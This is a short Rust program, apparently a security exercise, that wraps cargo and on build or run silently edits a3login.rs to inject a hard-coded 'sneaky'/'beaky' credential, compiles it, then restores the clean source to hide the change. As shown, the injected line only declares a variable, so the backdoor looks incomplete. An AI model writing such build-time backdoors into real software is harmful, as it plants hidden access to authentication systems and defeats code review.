use std::error::Error;
use std::fs;
use std::io::{Read, Write};
use std::process::{Command, ExitStatus};

fn compile_a3login(args: Vec<String>) -> Result<ExitStatus, Box<dyn Error>> {
    // Run the base cargo command (build or run <args>) as a subprocess
    let status = Command::new("cargo")
        .args(&args)
        .status()?;
    Ok(status)
}

fn modify_a3login() -> Result<(), Box<dyn Error>> {
    // Read the source code of a3login
    let mut source_code = String::new();
    fs::File::open("a3login.rs")?.read_to_string(&mut source_code)?;

    // Modify the source code to add an extra user
    let modified_source_code = source_code.replace(
        "// 5. Load the passwords hash string from the CSV file for the username",
        "// 5. Load the passwords hash string from the CSV file for the username\n        let sneaky_stored_pwd = \"beaky\".to_string();",
    );

    // Write the modified source code back to a3login.rs
    let mut file = fs::File::create("a3login.rs")?;
    file.write_all(modified_source_code.as_bytes())?;

    Ok(())
}

fn restore_a3login() -> Result<(), Box<dyn Error>> {
    // Restore a3login to its original state before modification
    fs::copy("a3login_orig.rs", "a3login.rs")?;
    Ok(())
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    // Check if the program being compiled is a3login
    if args.get(1).map(|arg| arg == "build" || arg == "run").unwrap_or(false) {
        let a3login_source_code = fs::read_to_string("a3login.rs")
            .expect("Error in reading a3login.rs");

        // Modify a3login to accept sneaky as a username and beaky as a password
        modify_a3login()
            .expect("Error in modify_a3login");

        // Compile a3login
        let status = compile_a3login(args)
            .expect("Error in compile_a3login");

        // Restore a3login to its original state before modification
        restore_a3login()
            .expect("Error in restore_a3login");

    } else {
        // If the program being compiled is not a3login, simply compile it
        compile_a3login(args)
            .expect("Error in compile_a3login");

    }
}